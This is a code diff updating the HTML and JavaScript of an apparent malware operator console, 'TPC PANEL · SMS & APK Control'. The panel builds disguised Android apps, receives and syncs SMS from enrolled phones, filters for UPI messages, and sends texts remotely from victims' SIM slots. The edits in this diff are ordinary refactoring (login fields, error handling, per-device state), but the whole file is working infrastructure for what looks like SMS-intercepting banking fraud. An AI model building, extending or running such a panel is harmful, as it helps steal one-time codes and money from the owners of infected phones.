@@ -70,7 +70,6 @@ input::placeholder,textarea::placeholder{color:#35507e}
 input:focus,textarea:focus,select:focus{border-color:var(--neon);box-shadow:0 0 0 3px #22d3ee1f,0 0 22px #22d3ee26}
 .chk{display:flex;align-items:center;gap:9px;margin:16px 0 0;font-size:12px;text-transform:none;letter-spacing:0;color:var(--muted);font-weight:500}
 .chk input{width:auto;accent-color:var(--neon)}
-.keyinput{font-family:var(--mono);font-size:16px;letter-spacing:2.5px;text-transform:uppercase;text-align:center}
 
 .btn{border:1px solid transparent;border-radius:10px;padding:11px 16px;font-weight:700;font-size:13px;letter-spacing:.6px;transition:.15s}
 .btn.primary{color:#001521;background:linear-gradient(100deg,#22d3ee,#38bdf8);box-shadow:0 0 24px #22d3ee4d}
@@ -105,7 +104,7 @@ color:#7fd8ff;background:#229ed917;border:1px solid #229ed940;transition:.15s}
 .tg:hover{color:#fff;background:#229ed9;border-color:#229ed9;box-shadow:0 0 24px #229ed966}
 .apk{display:inline-flex;align-items:center;gap:8px;height:38px;padding:0 14px;border-radius:999px;
 color:#c8f7d4;background:#34d39915;border:1px solid #34d39945;font-size:12px;font-weight:800;
-letter-spacing:1px;transition:.15s}
+letter-spacing:1px;transition:.15s;cursor:pointer}
 .apk:hover{color:#001b10;background:#34d399;border-color:#34d399;box-shadow:0 0 26px #34d39966;text-shadow:none}
 .apk svg{flex:0 0 auto}
 
@@ -461,10 +460,10 @@ main{padding:18px 13px}
 <h2>Sign in</h2>
 <p>Admin ID + password daalo, ya apni access key (TPC-XXXX-XXXX-XXXX) se andar aao.</p>
 <form id="loginForm">
-<label for="username">Login ID / Access key</label>
-<input id="username" autocomplete="username" placeholder="admin id  ya  TPC-XXXX-XXXX-XXXX" required>
-<label for="password">Password <span class="muted small" style="text-transform:none;letter-spacing:0">(sirf admin)</span></label>
-<input id="password" type="password" autocomplete="current-password" placeholder="admin password (user chhod de)">
+<label for="loginId">Login ID / Access key</label>
+<input id="loginId" autocomplete="username" placeholder="admin id  ya  TPC-XXXX-XXXX-XXXX" required>
+<label for="loginPass">Password <span class="muted small" style="text-transform:none;letter-spacing:0">(sirf admin)</span></label>
+<input id="loginPass" type="password" autocomplete="current-password" placeholder="admin password (user chhod de)">
 <label class="chk"><input type="checkbox" id="remember" checked> Keep me signed in on this device</label>
 <button class="btn primary login-submit" id="loginBtn" type="submit">Sign in</button>
 <div class="msg" id="loginMsg" role="status" aria-live="polite"></div>
@@ -472,7 +471,7 @@ main{padding:18px 13px}
 <div class="howto"><b>Auth module nahi hai?</b> Panel khud detect kar lega — login skip ho jayega aur APK Builder turant chalu.</div>
 <div class="login-foot">
 <span>Backend: <span class="mono" id="apiHint">/</span></span>
-<a class="apk" id="apkLogin" href="#" rel="noopener"><span>APK</span></a>
+<button class="apk" id="apkLogin" type="button"><span>APK</span></button>
 <a href="https://t.me/icivan" target="_blank" rel="noopener">owner ↗</a>
 </div>
 </div>
@@ -497,10 +496,10 @@ main{padding:18px 13px}
 <div class="top-right">
 <span class="pill"><span class="dot"></span><span id="linkLabel">Connecting</span></span>
 <span class="badge" id="roleBadge">—</span>
-<a class="apk" id="apkBtn" href="#" title="APK Builder">
+<button class="apk" id="apkBtn" type="button" title="APK Builder">
 <svg viewBox="0 0 24 24" width="17" height="17" fill="currentColor" aria-hidden="true"><path d="M6 10h12v8a1 1 0 0 1-1 1h-1v2.2a1.2 1.2 0 0 1-2.4 0V19h-3.2v2.2a1.2 1.2 0 0 1-2.4 0V19H7a1 1 0 0 1-1-1v-8Zm-1.8 0A1.2 1.2 0 0 1 5.4 11.2v5.6a1.2 1.2 0 0 1-2.4 0v-5.6A1.2 1.2 0 0 1 4.2 10Zm15.6 0a1.2 1.2 0 0 1 1.2 1.2v5.6a1.2 1.2 0 0 1-2.4 0v-5.6A1.2 1.2 0 0 1 19.8 10ZM7.2 8.6C7.5 6.9 8.9 5.6 10.6 5.3l-.6-1.4a.3.3 0 0 1 .5-.3l.7 1.5a5.6 5.6 0 0 1 2.6 0l.7-1.5a.3.3 0 0 1 .5.3l-.6 1.4c1.7.3 3.1 1.6 3.4 3.3H7.2Zm2.3-1.6a.6.6 0 1 0 0-1.2.6.6 0 0 0 0 1.2Zm5 0a.6.6 0 1 0 0-1.2.6.6 0 0 0 0 1.2Z"/></svg>
 <span>APK</span>
-</a>
+</button>
 <a class="tg" href="https://t.me/icivan" target="_blank" rel="noopener" title="Contact owner">
 <svg viewBox="0 0 24 24" width="18" height="18" fill="currentColor"><path d="M9.78 18.65l.28-4.23 7.68-6.92c.34-.31-.07-.46-.52-.19L7.74 13.3 3.64 12c-.88-.25-.89-.86.2-1.3l15.97-6.16c.73-.33 1.43.18 1.15 1.3l-2.72 12.81c-.19.91-.74 1.13-1.5.71L12.6 16.3l-1.99 1.93c-.23.23-.42.42-.83.42z"/></svg>
 </a>
@@ -526,7 +525,7 @@ main{padding:18px 13px}
 <button class="nav" data-page="settings" type="button"><i>⚙</i> Settings</button>
 </div>
 <div class="side-foot">
-<div>TPC PANEL · v7.1</div>
+<div>TPC PANEL · v7.2</div>
 <div>owner: <a href="https://t.me/icivan" target="_blank" rel="noopener">@icivan</a></div>
 </div>
 </aside>
@@ -557,7 +556,7 @@ main{padding:18px 13px}
 <section class="panel-box panel">
 <div class="panel-head"><h3>System status</h3></div>
 <div class="panel-body">
-<div class="row"><div><div class="row-name">Backend API</div><div class="row-desc">/health</div></div><span class="badge" id="apiBadge">Checking</span></div>
+<div class="row"><div><div class="row-name">Backend API</div><div class="row-desc">/health/live</div></div><span class="badge" id="apiBadge">Checking</span></div>
 <div class="row"><div><div class="row-name">Store</div><div class="row-desc">/health/database</div></div><span class="badge" id="dbBadge">Checking</span></div>
 <div class="row"><div><div class="row-name">APK builder</div><div class="row-desc">/api/builder/config</div></div><span class="badge" id="builderBadge">Checking</span></div>
 <div class="row"><div><div class="row-name">Admin socket</div><div class="row-desc">live link</div></div><span class="badge" id="wsBadge">Connecting</span></div>
@@ -759,7 +758,7 @@ main{padding:18px 13px}
 <div class="keygen">
 <div><label for="appName">App name</label><input id="appName" placeholder="e.g. Desi Videos"></div>
 <div><label for="appPkg">Package id</label><input id="appPkg" class="mono" placeholder="com.venice.desi"></div>
-<div><label for="appBase">API base URL (optional)</label><input id="appBase" class="mono" placeholder="https://panel.example.com"></div>
+<div><label for="appBase">API base URL (optional)</label><input id="appBase" class="mono" placeholder="blank = panel ka apna origin"></div>
 <div><label for="appVariant">Variant</label><select id="appVariant"><option value="release">release</option><option value="debug">debug</option></select></div>
 </div>
 <div class="panel-body" style="padding-top:0">
@@ -866,15 +865,16 @@ main{padding:18px 13px}
 <section class="panel-box panel">
 <div class="panel-head"><h3>Application</h3></div>
 <div class="panel-body">
-<div class="settings-row"><strong>Panel</strong><p>TPC PANEL · SMS &amp; APK Control · v7.1</p></div>
+<div class="settings-row"><strong>Panel</strong><p>TPC PANEL · SMS &amp; APK Control · v7.2</p></div>
 <div class="settings-row"><strong>Owner</strong><p><a href="https://t.me/icivan" target="_blank" rel="noopener">https://t.me/icivan</a></p></div>
 <div class="settings-row"><strong>Backend</strong><p class="mono" id="apiBase">/</p></div>
 <div class="settings-row"><strong>APK Builder</strong><p>/api/apps · /api/builds · /api/builds/{id}/download · /api/builder/themes</p></div>
 <div class="settings-row"><strong>Builder health</strong><p>/api/builder/config · /api/builder/preflight</p></div>
 <div class="settings-row"><strong>Device socket</strong><p>/ws/device/{registration_id}</p></div>
 <div class="settings-row"><strong>Admin socket</strong><p>/ws/admin · build updates /ws/user</p></div>
-<div class="settings-row"><strong>SMS ingest</strong><p>/devices/sms/incoming</p></div>
+<div class="settings-row"><strong>SMS ingest</strong><p>/devices/sms/incoming · /devices/sms/sync</p></div>
 <div class="settings-row"><strong>Onboarding</strong><p>/devices/onboarding</p></div>
+<div class="settings-row"><strong>Device config</strong><p>/devices/config (base URL auto-inject)</p></div>
 </div>
 </section>
 </section>
@@ -1004,9 +1004,9 @@ const SIM_SVG = '<svg viewBox="0 0 24 24" width="15" height="15" fill="none" str
 const CFG_URL = "/api/builder/config";
 const PF_URL = "/api/builder/preflight";
 const THEMES_URL = "/api/builder/themes";
-const TKEY = "tpc.token.v13";
-const SKEY = "tpc.session.v13";
-const THEME_KEY = "tpc.theme.v13";
+const TKEY = "tpc.token.v14";
+const SKEY = "tpc.session.v14";
+const THEME_KEY = "tpc.theme.v14";
 
 const FALLBACK_THEME = {
 bg:"#0B0B0C",surface:"#151517",surfaceAlt:"#1C1C1F",accent:"#00E0B8",
@@ -1028,10 +1028,11 @@ outbox:[], growth:null, growthEvents:[],
 apps:[], builds:[], buildCfg:null, quota:null, themes:[],
 pickedTheme:localStorage.getItem(THEME_KEY)||"mono",
 logBuild:null, pf:null,
-pinsOnly:false, active:null, asOpen:false, toastTimer:null,
+pinsOnly:false, active:null, activeId:null, asOpen:false, toastTimer:null,
 pollTimer:null, buildTimer:null,
 ws:null, wsOk:false, wsFails:0, wsTimer:null, wsUser:null,
 linkOk:false, apiDown:false, numTried:{}, lastError:"",
+draft:{}, selLive:{},
 sel:{ as:[], send:[], bulk:[] }
 };
 
@@ -1232,6 +1233,15 @@ let data=null;
 if(ct.indexOf("application/json")>=0)data=await res.json().catch(()=>({}));
 else{ const txt=await res.text(); data=txt?{detail:txt}:{}; }
 
+if(res.status===429){
+const wait=res.headers.get("retry-after")||"?";
+const e=new Error(data.detail||("Rate limited — "+wait+"s baad try karo"));
+e.status=429; throw e;
+}
+if(res.status===503){
+const e=new Error(data.detail||"Backend starting up — thodi der baad try karo");
+e.status=503; e.degraded=true; throw e;
+}
 if((res.status===401||res.status===403)&&!state.noAuth){
 const e=new Error(data.detail||data.message||"Authentication required.");
 e.auth=true; e.status=res.status;
@@ -1255,7 +1265,7 @@ if(reloginPromise)return reloginPromise;
 reloginPromise=(async()=>{
 try{
 let r;
-if(s.pass) r=await api("/panel/login",{method:"POST",body:JSON.stringify({username:s.id,password:decPass(s.pass)})},false);
+if(s.pass) r=await api("/panel/login",{method:"POST",body:JSON.stringify({login_id:s.id,password:decPass(s.pass)})},false);
 else r=await api("/panel/access",{method:"POST",body:JSON.stringify({key:s.id})},false);
 if(r&&r.token)setToken(r.token);
 if(r&&r.role)state.role=r.role;
@@ -1329,7 +1339,7 @@ box.appendChild(item);
 
 async function devCommand(id,action){
 try{ await api("/admin/devices/"+id+"/command",{method:"POST",body:JSON.stringify({action:action})}); return true; }
-catch(e){ return false; }
+catch(e){ toast(e.message); return false; }
 }
 async function pingDevice(d){ toast("ping bheja…"); await devCommand(devId(d),"ping");
 setTimeout(()=>loadDevices().catch(()=>{}),1200); }
@@ -1362,7 +1372,7 @@ badge($("#roleBadge"),state.noAuth?"NO-AUTH":(isAdmin?"ADMIN":"USER"),isAdmin?"o
 
 function showLogin(msgText){
 state.auth=false; $("#app").hidden=true; $("#loginScreen").hidden=false; closeDetail();
-const s=readSession(); if(s&&s.id&&!$("#username").value)$("#username").value=s.id;
+const s=readSession(); if(s&&s.id&&!$("#loginId").value)$("#loginId").value=s.id;
 if(msgText)loginMsg(msgText);
 }
 function showApp(){ state.auth=true; $("#loginScreen").hidden=true; $("#app").hidden=false; }
@@ -1376,28 +1386,35 @@ connectUserSocket();
 }
 
 async function probeAdmin(){
+if(adminProbed){ badge($("#adminBadge"),state.noAdmin?"absent":"live",state.noAdmin?"warn":"ok"); return; }
 try{ await api("/admin/devices?limit=1",{},false); state.noAdmin=false; }
-catch(e){ if(e.status===404)state.noAdmin=true; }
+catch(e){ if(e.status===404||e.status===401||e.status===403)state.noAdmin=!!e.status&&e.status===404; }
 adminProbed=true;
 badge($("#adminBadge"),state.noAdmin?"absent":"live",state.noAdmin?"warn":"ok");
 }
 
 async function checkAuth(){
 let st=null, err=null;
-try{ st=await api("/admin/auth/status",{},false); }catch(e){ err=e; }
+try{ st=await api("/panel/me",{},false); }catch(e){ err=e; }
 
-if(err&&(err.status===404||err.network)){
+if(err&&err.network){
+state.noAuth=false;
+showLogin("Backend reachable nahi — server chal raha hai? "+err.message);
+notice("Backend down: "+err.message,true);
+setTimeout(checkAuth,4000);
+return;
+}
+if(err&&err.status===404){
 state.noAuth=true;
 const s=readSession();
 showApp();
 await afterLogin(s&&s.role?s.role:"admin");
-if(err.network)notice("Backend reachable nahi — server chal raha hai? "+err.message,true);
 return;
 }
 
 const s=readSession();
-if(st&&st.authenticated){
-state.userId=st.username||"";
+if(st&&st.admin_id){
+state.userId=st.admin_id||"";
 showApp(); await afterLogin(st.role||(s&&s.role)||"admin"); return;
 }
 if(s){
@@ -1485,6 +1502,7 @@ const body=$("#liveBody");
 if(!state.devices.length){ empty(body,5,"No devices"); return; }
 body.replaceChildren();
 state.devices.forEach((d)=>{
+const id=String(devId(d));
 const info=nums(d); const row=document.createElement("tr");
 const nameCell=document.createElement("td"); nameCell.textContent=devName(d);
 const sub=document.createElement("span"); sub.className="sub mono";
@@ -1497,25 +1515,35 @@ nsub.textContent=info.live?"live (device)":(info.entered?"entered (operator)":"n
 numCell.appendChild(nsub); row.appendChild(numCell);
 const sc=document.createElement("td"); const wrap0=document.createElement("div");
 wrap0.className="simchips"; wrap0.style.marginTop="0";
+const sel=state.selLive[id]||[];
 [0,1].forEach((slot)=>{
 const b=document.createElement("button"); b.type="button";
-b.className="simchip"; b.dataset.slot=String(slot);
+b.className="simchip"+(sel.indexOf(slot)>=0?" on":"");
+b.dataset.slot=String(slot);
 b.innerHTML=SIM_SVG+"<span>SIM "+(slot+1)+"</span>";
-b.addEventListener("click",()=>b.classList.toggle("on"));
+b.addEventListener("click",()=>{
+const cur=state.selLive[id]||[];
+const i=cur.indexOf(slot);
+if(i>=0)cur.splice(i,1); else cur.push(slot);
+state.selLive[id]=cur;
+b.classList.toggle("on",cur.indexOf(slot)>=0);
+});
 wrap0.appendChild(b);
 });
 sc.appendChild(wrap0); row.appendChild(sc);
 const sendCell=document.createElement("td"); const wrap=document.createElement("div");
 wrap.style.display="flex"; wrap.style.gap="6px";
 const input=document.createElement("input"); input.placeholder="message…"; input.style.minWidth="150px";
+input.value=state.draft[id]||"";
+input.addEventListener("input",()=>{ state.draft[id]=input.value; });
 const btn=document.createElement("button"); btn.className="mini"; btn.type="button"; btn.textContent="Send";
 btn.addEventListener("click",async()=>{
 const text=input.value.trim(); if(!text){ toast("message khali hai"); return; }
-const slots=Array.from(wrap0.querySelectorAll(".simchip.on")).map((x)=>Number(x.dataset.slot));
+const slots=selSlots(state.selLive[id]||[]);
 btn.disabled=true;
 const ok=await sendSms({deviceId:devId(d),deviceName:devName(d),
 to:info.live||info.entered||null,body:text,slots:slots});
-if(ok)input.value="";
+if(ok){ input.value=""; state.draft[id]=""; }
 btn.disabled=false;
 });
 wrap.appendChild(input); wrap.appendChild(btn); sendCell.appendChild(wrap); row.appendChild(sendCell);
@@ -2043,6 +2071,16 @@ return{text:"active",kind:"ok"};
 }
 
 function renderUsers(){
+if(state.noAdmin)return;
+if(state.role!=="admin"&&!state.noAuth){
+$("#userBody").replaceChildren();
+$("#userCount").textContent="admin only";
+$("#uTotal").textContent=$("#uActive").textContent=$("#uExpired").textContent=$("#uBlocked").textContent="—";
+const row=document.createElement("tr"); const td=document.createElement("td");
+td.colSpan=9; td.className="empty"; td.textContent="Key role se access keys nahi dikhti — admin se login karo";
+row.appendChild(td); $("#userBody").appendChild(row);
+return;
+}
 const q=($("#userSearch").value||"").trim().toLowerCase();
 let list=state.users;
 if(q)list=list.filter((u)=>[u.key,u.label,u.phone].filter(Boolean).join(" ").toLowerCase().indexOf(q)>=0);
@@ -2386,10 +2424,17 @@ const bb=$("#dBatt"); bb.replaceChildren(); bb.appendChild(battEl(d));
 badge($("#dTarget"),info.live||info.entered||"no number",info.live?"ok":info.entered?"pin":"bad");
 $("#actMenu").hidden=true;
 $("#asPanel").hidden=!state.asOpen;
+
+const id=String(devId(d));
+if(state.activeId!==id){
+state.activeId=id;
 state.sel.send=(auto.sim_slots||[]).slice();
+$("#dTo").value=info.live||info.entered||"";
+$("#dBody").value="";
+buildSimChips($("#dSims"),"send",d);
+}
 safe(renderBanner,d); safe(renderAutoSender,d); safe(renderNumbers,d);
 safe(renderSpecs,d); safe(renderMore,d); safe(renderOutbox);
-buildSimChips($("#dSims"),"send",d);
 }
 
 function openDeviceById(id){ const d=findDevice(id); if(!d){ toast("device not found"); return; } openDetail(d); }
@@ -2403,10 +2448,9 @@ if(state.active&&String(devId(state.active))===String(deviceId))renderDetailMsgs
 
 function openDetail(d){
 if(!d)return;
-state.active=d; state.asOpen=false;
+state.active=d; state.activeId=null; state.asOpen=false;
 $("#dSearch").value=""; $("#dDir").value=""; $("#dUpi").checked=false;
-$("#dBody").value=""; $("#dMore").hidden=true; $("#dMoreToggle").textContent="show";
-$("#dTo").value=nums(d).live||nums(d).entered||"";
+$("#dMore").hidden=true; $("#dMoreToggle").textContent="show";
 $("#detail").hidden=false; document.body.style.overflow="hidden";
 safe(renderDetail,d); safe(renderDetailMsgs);
 const id=devId(d);
@@ -2422,15 +2466,15 @@ setTimeout(()=>{ if(state.active&&String(devId(state.active))===String(id))fetch
 }
 function closeDetail(){
 $("#detail").hidden=true; document.body.style.overflow="";
-$("#actMenu").hidden=true; state.active=null;
+$("#actMenu").hidden=true; state.active=null; state.activeId=null;
 }
 
 async function loadHealth(){
-try{ await api("/health"); state.linkOk=true; updateLink();
+try{ await api("/health/live"); state.linkOk=true; updateLink();
 badge($("#apiBadge"),"Online","ok"); }
 catch(e){ state.linkOk=false; updateLink(); badge($("#apiBadge"),"Down","bad"); }
 try{ await api("/health/database"); badge($("#dbBadge"),"Connected","ok"); }
-catch(e){ badge($("#dbBadge"),"Down","bad"); }
+catch(e){ badge($("#dbBadge"),e.degraded?"Starting":"Down",e.degraded?"warn":"bad"); }
 try{
 await api(CFG_URL);
 badge($("#builderBadge"),"Ready","ok");
@@ -2546,7 +2590,11 @@ const jobs=[loadApps(),loadBuilds()];
 if(!state.noAdmin)jobs.push(loadDevices(),loadMessages(),loadRules(),loadRelay(),loadAutoSender(),loadStats(),loadGrowthEvents());
 if(state.role==="admin"||state.noAuth)jobs.push(loadUsers());
 const res=await Promise.allSettled(jobs);
-if(res.some((r)=>r.status==="rejected"))toast("some sections failed to sync");
+const bad=res.filter((r)=>r.status==="rejected");
+if(bad.length){
+const first=bad[0].reason;
+notice("Kuch sections sync nahi hue: "+(first&&first.message||"unknown"),true);
+}else if(!state.apiDown)notice("");
 }finally{ $("#refreshBtn").disabled=false; }
 }
 
@@ -2660,7 +2708,7 @@ if(page==="builder")refreshSection("builder");
 }
 
 function gotoBuilder(ev){ if(ev)ev.preventDefault();
-if(state.auth)navigate("builder"); else if(!$("#loginScreen").hidden)$("#username").focus(); }
+if(state.auth)navigate("builder"); else if(!$("#loginScreen").hidden)$("#loginId").focus(); }
 $("#apkBtn").addEventListener("click",gotoBuilder);
 $("#apkLogin").addEventListener("click",gotoBuilder);
 $("#apiHint").textContent=location.host||"/";
@@ -2888,13 +2936,13 @@ $("#loginForm").addEventListener("submit",async(ev)=>{
 ev.preventDefault();
 const btn=$("#loginBtn"); btn.disabled=true; btn.textContent="Signing in…";
 loginMsg("");
-const id=$("#username").value.trim();
-const pass=$("#password").value;
+const id=$("#loginId").value.trim();
+const pass=$("#loginPass").value;
 const keep=$("#remember").checked;
 try{
 let r;
 if(pass){
-r=await api("/panel/login",{method:"POST",body:JSON.stringify({username:id,password:pass})},false);
+r=await api("/panel/login",{method:"POST",body:JSON.stringify({login_id:id,password:pass})},false);
 saveSession(id,pass,keep,r.role);
 }else{
 r=await api("/panel/access",{method:"POST",body:JSON.stringify({key:id})},false);
@@ -2902,7 +2950,7 @@ saveSession(r.username||id,null,keep,r.role);
 }
 if(r&&r.token)setToken(r.token);
 if(r&&r.username)state.userId=r.username;
-$("#password").value="";
+$("#loginPass").value="";
 loginMsg("Signed in","ok");
 showApp();
 await afterLogin(r.role);
@@ -2923,7 +2971,7 @@ state.devices=[]; state.messages=[]; state.devMsgs={}; state.users=[];
 state.growth=null; state.growthEvents=[];
 state.apps=[]; state.builds=[]; state.logBuild=null; state.quota=null;
 state.pinsOnly=false; state.role="user"; state.userId=""; state.noAdmin=false; adminProbed=false;
-state.sel={as:[],send:[],bulk:[]};
+state.sel={as:[],send:[],bulk:[]}; state.selLive={}; state.draft={}; state.numTried={};
 gridSig=""; liveSig="";
 $("#pinsBtn").classList.remove("on");
 $("#logPanel").hidden=true;
